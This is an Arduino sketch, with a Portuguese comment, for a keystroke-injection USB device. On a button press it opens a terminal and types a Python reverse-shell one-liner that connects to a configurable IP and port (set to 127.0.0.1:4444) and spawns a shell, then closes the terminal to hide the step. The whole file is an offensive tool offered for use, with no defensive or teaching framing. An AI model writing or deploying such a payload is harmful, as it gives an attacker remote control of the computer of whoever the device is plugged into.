#include <Keyboard.h>

#define BUTTON_PIN 2  // Botão ligado ao pino 2 e ao GND
#define IP "127.0.0.1"
#define PORT 4444

String build_command(){
  String command = "python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((\"";
  command += IP;
  command += "\",";
  command += PORT;
  command += "));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")' & disown";
  return command;
}

void setup() {
  pinMode(BUTTON_PIN, INPUT_PULLUP);
  Keyboard.begin(KeyboardLayout_pt_BR);
}

void loop() {
  if (digitalRead(BUTTON_PIN) == LOW) {

    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press('t');
    Keyboard.releaseAll();

    delay(1500);
    Keyboard.println(build_command());
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    delay(200);
    Keyboard.print("exit");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

  }
}
